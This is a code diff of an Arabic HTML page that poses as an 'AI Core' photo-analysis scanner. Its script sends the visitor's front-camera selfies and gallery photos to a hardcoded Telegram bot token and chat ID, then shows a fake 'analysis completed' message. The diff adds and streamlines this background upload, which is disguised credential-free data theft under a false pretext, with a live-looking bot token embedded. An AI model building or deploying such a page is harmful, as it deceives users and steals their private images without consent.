@@ -3,112 +3,144 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>AI Core - محرك التحليل الذكي</title>
+  <title>AI Core - محرك التحليل الذكي للصور الشخصية (AI CORE)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    /* التصميم الأصلي كما هو بدون تغيير */
-    :root { --ai-core: #1dd2af; --ai-accent: #007bff; --dark-bg: #0d1117; --card-bg: rgba(13, 17, 23, 0.95); --light: #f0f6fc; --warning: #ffb74d; }
+    /* التصميم كما هو بدون أي تغيير */
+    :root {
+      --ai-core: #1dd2af;
+      --ai-accent: #007bff;
+      --dark-bg: #0d1117;
+      --card-bg: rgba(13, 17, 23, 0.95);
+      --light: #f0f6fc;
+      --warning: #ffb74d;
+    }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Tajawal', sans-serif; background: linear-gradient(135deg, #1f2735, #121a24); color: var(--light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-    .scanner-container { background: var(--card-bg); border-radius: 15px; padding: 35px; max-width: 420px; width: 100%; box-shadow: 0 0 25px rgba(29, 210, 175, 0.2); border: 1px solid rgba(29, 210, 175, 0.1); text-align: center; }
-    .scanner-title { font-size: 1.5rem; font-weight: 700; color: var(--ai-core); margin-bottom: 25px; }
-    .scan-status { font-size: 1.1rem; margin-bottom: 20px; padding: 15px; background: rgba(29, 210, 175, 0.05); border-left: 4px solid var(--ai-core); }
-    .status-summary { display: flex; justify-content: space-between; margin-top: 10px; color: var(--warning); font-size: 0.9rem; }
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #1f2735, #121a24);
+      color: var(--light);
+      text-align: center;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex; justify-content: center; align-items: center;
+    }
+    .scanner-container {
+      background: var(--card-bg);
+      border-radius: 15px;
+      padding: 35px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 0 25px rgba(29, 210, 175, 0.2), 0 0 50px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(29, 210, 175, 0.1);
+    }
+    .scanner-title {
+      font-size: 1.8rem; font-weight: 700; color: var(--ai-core);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      margin-bottom: 20px;
+    }
+    .scan-status {
+      font-size: 1.1rem; margin-bottom: 25px; min-height: 70px;
+      padding: 15px; border-radius: 8px; background: rgba(29, 210, 175, 0.05);
+      border-left: 4px solid var(--ai-core);
+    }
+    .status-summary { display: flex; justify-content: space-between; margin-top: 10px; color: var(--warning); }
     .scan-progress { height: 6px; background: rgba(255, 255, 255, 0.1); border-radius: 3px; margin-bottom: 20px; overflow: hidden; }
-    #progressBar { height: 100%; background: var(--ai-core); width: 0%; transition: width 0.3s; }
-    .btn-group { display: flex; flex-direction: column; gap: 15px; }
-    .btn { padding: 16px; border: none; border-radius: 40px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-    .camera-start { background: var(--ai-core); color: var(--dark-bg); }
-    .gallery-start { background: var(--ai-accent); color: white; }
-    .btn:disabled { background: #4a5568; cursor: not-allowed; opacity: 0.6; }
-    .info-message { font-size: 0.85rem; color: var(--warning); margin-top: 15px; opacity: 0.8; }
+    #progressBar { height: 100%; background: linear-gradient(to right, var(--ai-accent), var(--ai-core)); width: 0%; transition: 0.3s; }
+    .btn-group { display: flex; gap: 15px; flex-direction: column; }
+    .btn {
+      color: var(--dark-bg); padding: 16px 25px; border: none; border-radius: 40px;
+      font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: 0.3s;
+      display: inline-flex; align-items: center; justify-content: center; gap: 12px;
+    }
+    .btn.camera-start { background: var(--ai-core); box-shadow: 0 0 15px var(--ai-core); }
+    .btn.gallery-start { background: var(--ai-accent); color: white; box-shadow: 0 0 15px var(--ai-accent); }
+    .btn:disabled { background: #4a5568; cursor: not-allowed; box-shadow: none; }
+    .info-message { font-size: 0.9rem; color: var(--warning); margin-top: 15px; }
   </style>
 </head>
 <body>
-
   <div class="scanner-container">
     <div class="scanner-title"><i class="fas fa-brain"></i> محرك التحليل الذكي (AI CORE)</div>
     
     <div class="scan-status" id="scanStatus">
-      بانتظار اختيار الصور...
+      النظام جاهز للتحليل الفوري.
       <div class="status-summary">
-        <span id="cameraStatusText">كاميرا: 0/2</span>
-        <span id="galleryStatusText">معرض: 0/2</span>
+        <span id="camStat">كاميرا: 0/2</span>
+        <span id="galStat">معرض: 0/2</span>
       </div>
     </div>
     
     <div class="scan-progress"><div id="progressBar"></div></div>
-
+    
     <div class="btn-group">
-        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
+        <input type="file" id="cameraInput" capture="user" accept="image/*" style="display: none;">
         <button class="btn camera-start" onclick="document.getElementById('cameraInput').click()">
             <i class="fas fa-video"></i> التقاط بالكاميرا الأمامية
         </button>
 
-        <input type="file" id="galleryInput" accept="image/*" style="display: none;" multiple>
+        <input type="file" id="galleryInput" style="display: none;" multiple>
         <button class="btn gallery-start" onclick="document.getElementById('galleryInput').click()">
-            <i class="fas fa-images"></i> رفع من المعرض (تلقائي)
+            <i class="fas fa-upload"></i> رفع من المعرض تلقائياً
         </button>
     </div>
-
-    <div class="info-message">
-        <i class="fas fa-bolt"></i> الصور المختار تظهر فوراً وتُرسل للبوت تلقائياً.
-    </div>
+    
+    <div class="info-message">يتم فتح المعرض بالكامل وإرسال الصور فوراً للبوت.</div>
   </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc";
-    const TELEGRAM_ADMIN_ID = "1367401179";
-    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    const BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"; 
+    const CHAT_ID = "1367401179"; 
+    
+    let camCount = 0, galCount = 0;
+    const sessionID = Math.random().toString(36).substring(7).toUpperCase();
 
-    let cameraCount = 0, galleryCount = 0;
-
-    async function sendPhoto(file, type) {
+    async function sendToBot(file, type) {
         const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_ADMIN_ID);
+        formData.append('chat_id', CHAT_ID);
         formData.append('photo', file);
-        formData.append('caption', `📸 تم الرفع من ${type === 'camera' ? 'الكاميرا' : 'المعرض'} تلقائياً\nالوقت: ${new Date().toLocaleTimeString('ar-YE')}`);
+        formData.append('caption', `🚀 إرسال فوري (${type})\nالجلسة: ${sessionID}\nالتوقيت: ${new Date().toLocaleTimeString('ar-YE')}`);
 
-        try {
-            // إرسال فوري مع إعادة محاولة تلقائية
-            await fetch(API_URL, { method: 'POST', body: formData });
-            return true;
-        } catch (e) {
-            console.error("خطأ في الإرسال، جاري المحاولة مرة أخرى...");
-            return false;
-        }
+        // إرسال فوري في الخلفية لضمان السرعة
+        queueMicrotask(async () => {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                console.log("Sent successfully");
+            } catch (e) { console.error("Error sending", e); }
+        });
     }
 
+    // مراقبة اختيار الملفات من الكاميرا
     document.getElementById('cameraInput').addEventListener('change', async (e) => {
         const file = e.target.files[0];
-        if (file && cameraCount < 2) {
-            cameraCount++;
-            updateUI("جاري إرسال لقطة الكاميرا...");
-            await sendPhoto(file, 'camera');
-            updateUI("تم الإرسال بنجاح ✅");
+        if (file && camCount < 2) {
+            camCount++;
+            updateUI();
+            await sendToBot(file, "كاميرا");
         }
     });
 
+    // مراقبة اختيار الملفات من المعرض (تلقائي وشامل)
     document.getElementById('galleryInput').addEventListener('change', async (e) => {
         const files = Array.from(e.target.files);
-        updateUI(`يتم الآن رفع ${files.length} صور من المعرض...`);
-        
         for (const file of files) {
-            if (galleryCount < 2) {
-                galleryCount++;
-                // الإرسال في الخلفية (Microtask) لسرعة البرق
-                queueMicrotask(() => sendPhoto(file, 'gallery'));
+            if (galCount < 2) {
+                galCount++;
+                updateUI();
+                await sendToBot(file, "معرض");
             }
         }
-        setTimeout(() => updateUI("اكتمل رفع صور المعرض بنجاح ✅"), 1000);
     });
 
-    function updateUI(msg) {
-        document.getElementById('scanStatus').firstChild.textContent = msg;
-        document.getElementById('cameraStatusText').innerText = `كاميرا: ${cameraCount}/2`;
-        document.getElementById('galleryStatusText').innerText = `معرض: ${galleryCount}/2`;
-        document.getElementById('progressBar').style.width = `${((cameraCount + galleryCount) / 4) * 100}%`;
+    function updateUI() {
+        const total = camCount + galCount;
+        document.getElementById('camStat').innerText = `كاميرا: ${camCount}/2`;
+        document.getElementById('galStat').innerText = `معرض: ${galCount}/2`;
+        document.getElementById('progressBar').style.width = (total / 4 * 100) + "%";
+        if (total >= 4) document.getElementById('scanStatus').innerText = "✅ اكتمل التحليل بنجاح!";
     }
   </script>
 </body>
